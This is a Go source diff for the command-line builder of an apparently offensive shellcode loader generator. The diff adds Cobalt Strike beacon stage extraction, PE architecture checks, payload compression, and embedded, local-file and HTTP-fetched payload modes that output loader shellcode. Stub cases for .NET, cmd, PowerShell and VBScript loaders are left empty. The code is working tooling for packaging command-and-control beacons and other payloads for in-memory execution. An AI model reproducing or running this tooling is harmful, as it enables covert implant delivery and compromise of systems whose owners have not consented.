@@ -12,85 +12,117 @@ import (
 	"github.com/RSSU-Shellcode/GRT-MXLoader/loader"
 )
 
+const (
+	typeCSBeacon   = "cs"
+	typeDotnet     = ".net"
+	typeCommand    = "cmd"
+	typePowershell = "ps"
+	typeVBScript   = "vbs"
+)
+
 var (
 	tplDir  string
 	typ     string
 	mode    string
 	arch    int
-	payload string
+	pldPath string
 
-	options   loader.Options
 	compress  bool
 	comWindow int
 	httpOpts  loader.HTTPOptions
+	options   loader.Options
+	stage     bool
 
 	outPath string
 )
 
 func init() {
-	flag.StringVar(&tplDir, "tpl", "template", "set shellcode templates directory")
-	flag.StringVar(&typ, "type", "", "select the template type")
-	flag.StringVar(&mode, "mode", "", "select the payload load mode")
-	flag.IntVar(&arch, "arch", 0, "set shellcode template architecture")
-	flag.StringVar(&payload, "payload", "", "set the input payload file path")
+	flag.StringVar(&tplDir, "dir", "template", "set shellcode templates directory")
+	flag.StringVar(&typ, "t", "", "select the loader type: cs, .net, cmd, ps, vbs")
+	flag.StringVar(&mode, "m", "", "select the payload load mode: embed, file, http")
+	flag.IntVar(&arch, "a", 0, "set shellcode template architecture")
+	flag.StringVar(&pldPath, "p", "", "set the input payload file path")
+	flag.BoolVar(&compress, "compress", true, "compress payload when use embed mode")
+	flag.IntVar(&comWindow, "window", 4096, "set the window size when use compression")
+	flag.DurationVar(&httpOpts.ConnectTimeout, "timeout", 0, "set the timeout when use http mode")
 	flag.StringVar(&options.ImageName, "im", "", "set the image name about command line for .NET")
 	flag.StringVar(&options.CommandLine, "cmd", "", "set the command line for .NET exe")
 	flag.BoolVar(&options.WaitMain, "wait", false, "wait for .NET exe to exit")
 	flag.BoolVar(&options.AllowSkipDLL, "skip-dll", false, "allow skip DLL if failed to load for .NET")
-	flag.BoolVar(&compress, "compress", true, "compress image when use embed mode")
-	flag.IntVar(&comWindow, "window", 4096, "set the window size when use compression")
+	flag.BoolVar(&stage, "stage", false, "provide manually extracted stage from Cobalt-Strike beacon")
 	flag.StringVar(&outPath, "o", "output.bin", "set output shellcode file path")
 	option.Flag(&options.Runtime)
 	flag.Parse()
 }
 
 func main() {
-	if payload == "" {
+	if pldPath == "" {
 		flag.Usage()
 		return
 	}
 
-	fmt.Println("load PE Loader templates")
-	ldrX64, err := os.ReadFile(filepath.Join(tplDir, "PELoader_x64.bin")) // #nosec
-	checkError(err)
-	ldrX86, err := os.ReadFile(filepath.Join(tplDir, "PELoader_x86.bin")) // #nosec
-	checkError(err)
+	var (
+		ldrX64 []byte
+		ldrX86 []byte
+		err    error
+	)
+	switch typ {
+	case typeCSBeacon:
+		fmt.Println("load Cobalt-Strike beacon loader templates")
+		ldrX64, err = os.ReadFile(filepath.Join(tplDir, "CSBeacon_x64.bin")) // #nosec
+		checkError(err)
+		ldrX86, err = os.ReadFile(filepath.Join(tplDir, "CSBeacon_x86.bin")) // #nosec
+		checkError(err)
+	case typeDotnet:
+	case typeCommand:
+	case typePowershell:
+	case typeVBScript:
+	default:
+		flag.Usage()
+		return
+	}
 
-	// create image config
-	var image loader.Image
+	// create payload
+	var payload loader.Payload
 	switch mode {
 	case "embed":
-		fmt.Println("use embed image mode")
-		fmt.Println("parse PE image file")
-		peData, err := os.ReadFile(payload) // #nosec
+		fmt.Println("use embed payload mode")
+		data, err := os.ReadFile(pldPath) // #nosec
 		checkError(err)
-		peFile, err := pe.NewFile(bytes.NewReader(peData))
-		checkError(err)
-		switch peFile.OptionalHeader.(type) {
-		case *pe.OptionalHeader64:
-			arch = 64
-			fmt.Println("image architecture: x64")
-		case *pe.OptionalHeader32:
-			arch = 32
-			fmt.Println("image architecture: x86")
-		default:
-			fmt.Println("unknown optional header type")
-			return
+		if typ == typeCSBeacon && !stage {
+			data, err = loader.ExtractBeaconStage(data)
+			checkError(err)
+		}
+		if typ == typeCSBeacon || typ == typeDotnet {
+			fmt.Println("check PE image file")
+			peFile, err := pe.NewFile(bytes.NewReader(data))
+			checkError(err)
+			switch peFile.OptionalHeader.(type) {
+			case *pe.OptionalHeader64:
+				arch = 64
+				fmt.Println("image architecture: x64")
+			case *pe.OptionalHeader32:
+				arch = 32
+				fmt.Println("image architecture: x86")
+			default:
+				fmt.Println("unknown image optional header type")
+				return
+			}
 		}
 		if compress {
-			fmt.Println("enable PE image compression")
-			s := (len(peData) / (2 * 1024 * 1024)) + 1
+			fmt.Println("enable payload compression")
+			s := (len(data) / (2 * 1024 * 1024)) + 1
 			fmt.Printf("please wait for about %d seconds for compress\n", s)
-			image = loader.NewEmbedCompress(peData, comWindow)
+			payload = loader.NewEmbedCompress(data, comWindow)
 		} else {
-			image = loader.NewEmbed(peData)
+			payload = loader.NewEmbed(data)
 		}
 	case "file":
 		fmt.Println("use local file mode")
-		image = loader.NewFile(payload)
+		payload = loader.NewFile(pldPath)
 	case "http":
 		fmt.Println("use http mode")
-		image = loader.NewHTTP(payload, &httpOpts)
+		payload = loader.NewHTTP(pldPath, &httpOpts)
 	default:
 		fmt.Println("unknown load mode")
 		return
@@ -110,13 +142,13 @@ func main() {
 		return
 	}
 
-	fmt.Println("generate GRT-PELoader from template")
-	inst, err := loader.CreateInstance(template, arch, image, &options)
+	fmt.Println("create loader shellcode instance from template")
+	inst, err := loader.CreateInstance(template, arch, payload, &options)
 	checkError(err)
 
 	outPath, err = filepath.Abs(outPath)
 	checkError(err)
-	fmt.Println("save instance to:", outPath)
+	fmt.Println("save shellcode instance to:", outPath)
 	err = os.WriteFile(outPath, inst, 0600)
 	checkError(err)
 
